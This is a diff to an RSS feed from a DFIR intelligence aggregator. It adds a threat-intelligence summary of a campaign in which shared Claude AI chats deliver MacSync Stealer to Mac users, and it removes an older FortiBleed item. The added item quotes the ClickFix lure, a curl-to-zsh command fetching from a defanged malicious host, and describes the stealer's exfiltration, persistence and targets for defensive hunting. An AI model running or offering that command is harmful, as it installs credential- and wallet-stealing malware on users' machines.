@@ -5,8 +5,29 @@
     <link>https://x.com/DFIR_Radar</link>
     <description>Keeping DFIR Intelligence on your Radar. The latest DFIR research from hundreds of sources, ranked by relevance for practitioners.</description>
     <language>en</language>
-    <lastBuildDate>Wed, 15 Jul 2026 14:04:46 +0000</lastBuildDate>
+    <lastBuildDate>Wed, 15 Jul 2026 15:05:38 +0000</lastBuildDate>
     <atom:link href="https://falhumaid.github.io/DFIR_Radar_RSS/rss.xml" rel="self" type="application/rss+xml"/>
+    <item>
+      <title>ClaudeFix: Shared Claude Chats Meet ClickFix</title>
+      <link>https://www.zscaler.com/blogs/security-research/claudefix-shared-claude-chats-meet-clickfix</link>
+      <description>MacSync Stealer distributed via ClickFix commands embedded in shared Claude AI chats, using Google malvertising to reach Mac users searching for Claude between June 12-19, 2026.
+
+- Malvertising drove victims searching "claude download" to shared Claude chats impersonating "Apple Support." The ClickFix lure instructed users to paste: curl -kfsSL $(echo '[base64]'|base64 -D)|zsh, fetching stage one from lasvegaslaminateflooring[.]com/curl/0e17984a73d0b1c9c7c3916d32c49c8937f2e42d4c72c543c82999463a507abb
+
+- Three-stage fileless chain: stage one returns a gzip-compressed zsh script, stage two runs entirely via eval and pipes stage three to osascript, leaving no file on disk. Exfiltration writes to /tmp/osalogging.zip in 10MB chunks via HTTP PUT, then self-deletes. Persistence appends a curl command to ~/.zshrc.
+
+- MacSync Stealer targets macOS keychain files, Chromium and Gecko browser credentials, 100+ crypto wallet extensions, desktop wallets (Exodus, Electrum, Ledger Live, Trezor), SSH/AWS/Kubernetes keys, and files matching wallet, seed, kdbx, pem, ovpn extensions. Russian-language comments in the AppleScript payload suggest a Russian-speaking threat actor.
+
+- C2 infrastructure used US 🇺🇸 city-themed domains: 22 Google campaign IDs observed across 7 search terms including "claude 客户端."
+
+Hunt macOS endpoints for ~/.zshrc modifications containing curl pipes to zsh, /tmp/macsync_*.lock directories, and /tmp/osalogging.zip.
+
+#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2077409254688911616</description>
+      <category>THREAT INTELLIGENCE</category>
+      <source url="https://x.com/DFIR_Radar/status/2077409254688911616">DFIR Radar</source>
+      <pubDate>Wed, 15 Jul 2026 15:05:38 +0000</pubDate>
+      <guid isPermaLink="false">2077409254688911616</guid>
+    </item>
     <item>
       <title>Investigating Persistence Mechanisms in AWS</title>
       <link>https://www.rapid7.com/blog/post/dr-investigating-aws-persistence-mechanisms</link>
@@ -1563,17 +1584,6 @@ Hunt: For any Firebase-backed app, pull /__/firebase/init.json, extract projectI
       <source url="https://x.com/DFIR_Radar/status/2074585202207428945">DFIR Radar</source>
       <pubDate>Tue, 07 Jul 2026 20:03:51 +0000</pubDate>
       <guid isPermaLink="false">2074585202207428945</guid>
-    </item>
-    <item>
-      <title>Cydome reports FortiBleed credential leak poses elevated risks to maritime and energy critical infrastructure</title>
-      <link>https://industrialcyber.co/utilities-energy-power-water-waste/cydome-reports-fortibleed-credential-leak-poses-elevated-risks-to-maritime-and-energy-critical-infrastructure/</link>
-      <description>FortiBleed exposed 86,000+ working FortiGate admin credentials via brute-forced legacy SHA-256 password hashes retained in config files even after FortiOS upgrades. Over 250 maritime and energy orgs are confirmed in the dataset.
-
-#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2074569971284300113</description>
-      <category>ICS/OT SECURITY</category>
-      <source url="https://x.com/DFIR_Radar/status/2074569971284300113">DFIR Radar</source>
-      <pubDate>Tue, 07 Jul 2026 19:03:20 +0000</pubDate>
-      <guid isPermaLink="false">2074569971284300113</guid>
     </item>
   </channel>
 </rss>
